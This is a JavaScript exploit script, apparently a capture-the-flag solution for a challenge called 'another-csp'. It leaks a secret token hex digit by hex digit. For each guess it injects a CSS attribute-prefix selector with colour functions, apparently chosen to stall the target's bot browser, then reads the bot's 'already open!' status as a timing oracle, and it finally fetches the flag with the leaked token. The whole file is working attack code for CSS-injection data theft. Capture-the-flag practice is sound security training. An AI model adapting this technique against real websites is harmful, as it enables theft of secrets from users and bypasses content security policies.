const host = 'https://another-csp-b86663d8901413d0.mc.ax';

let token = '';

const sleep = timeout => new Promise(resolve => setTimeout(resolve, timeout));
const oracle = guess => `<style>h1[data-token^="${guess}"] {
  --c1: color-mix(in srgb, blue 50%, red);
  --c2: srgb(from var(--c1) r g b);
  background-color: var(--c2);
}</style>`;

const run = async guess => {
	await (await fetch(`${host}/bot?code=` + encodeURIComponent(oracle(guess)))).text();
	await sleep(8000);
	let res = await (await fetch(`${host}/bot`)).text();
	if (res.trim() === 'already open!') {
		console.log(guess);
		await sleep(3000);
		return true;
	}
	return false;
}

for (let i = 0; i < 6; i++) {
	for (let guess = 0; guess < 16; guess++) {
		const hex = guess.toString(16);
		console.log('trying', token + hex)
		if (await run(token + hex)) {
			token += hex;
			break;
		}
		console.log('fail');
	}
}

console.log(await (await fetch(`${host}/flag?token=${token}`)).text());
